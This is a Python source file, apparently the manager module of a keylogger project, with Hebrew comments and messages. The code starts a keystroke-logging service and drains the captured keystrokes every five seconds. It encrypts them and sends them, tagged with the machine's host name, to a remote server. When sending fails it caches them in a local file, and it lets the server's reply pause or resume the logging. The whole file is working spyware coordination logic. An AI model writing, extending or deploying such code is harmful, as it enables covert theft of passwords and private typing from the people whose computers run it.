import json
import time
import socket

from file_writer import FileWriter
from keylogger_service import KeyLogger
from encryptor import Encryptor
from network_writer import NetworkWriter

def timer():
    time.sleep(5)

class Manager:
    def __init__(self):
        self.machine_name = socket.gethostname()
        self.file_writer = FileWriter()
        self.service = KeyLogger(self.machine_name)
        self.encryptor = Encryptor()
        self.network_writer = NetworkWriter()

    def continue_listening(self):
        self.service.continue_listen()

    def stop_listening(self):
        self.service.stop()

    def file_write(self, data):
        self.file_writer.send_data(data, self.machine_name)

    def delete_file(self,machine_name):
        self.file_writer.delete_file(machine_name)

    def file_content(self):
        data = self.file_writer.read_data(self.machine_name)
        if data is None:
            return
        res = self.network_writer.send_data(data,self.machine_name)
        if res is None or res.status_code != 200:
            print("שליחה נכשלה. שומר את הנתונים לקובץ.")
            return
        print("הנתונים נשלחו בהצלחה.")
        self.delete_file(self.machine_name)


    def manage(self):
        self.service.start()
        while True:
            try:
                timer()                                                                 # המתנה בין כל שליחה
                data = self.service.get_and_clear_buffer()                              # שלב 1: מושך נתונים מהבאפר של השירות ומנקה אותו
                print(data)
                encrypted_data = self.encryptor.encrypt_dict(data)                      # שלב 2: מצפין את הנתונים לפני השליחה
                res = self.network_writer.send_data(encrypted_data, self.machine_name)  # שלב 3: מנסה לשלוח את הנתונים
                self.file_content()
                                                                                        # בדיקת התגובה מהשרת
                if res is None or res.status_code != 200:
                    print("שליחה נכשלה. שומר את הנתונים לקובץ.")
                    self.file_write(encrypted_data)
                    continue                                                            # ממשיך ללולאה הבאה
                print("הנתונים נשלחו בהצלחה.")                                          # אם הגעת לכאן, הכל תקין (קוד0 200)
                try:                                                                    # שלב 4: טיפול בתוכן התגובה
                    response_data = res.json()
                    status_listen = response_data.get('status_listen')                  # בודק אם נשלח סטטוס הקשבה
                    if status_listen is not None:
                        if status_listen == 0:
                            print("התקבל סטטוס עצירה מהשרת.")
                            self.stop_listening()
                        else:
                            print("התקבל סטטוס המשך מהשרת.")
                            self.continue_listening()
                    else:
                        print("המפתח 'status_listen' לא נמצא בתגובה.")

                except json.JSONDecodeError:
                    self.file_write(encrypted_data)
            except Exception as e:
                print(e)


if __name__ == "__main__":
    manager = Manager()

    try:
        manager.manage()
    except KeyboardInterrupt:
        print("\nהמנהל הופסק.")
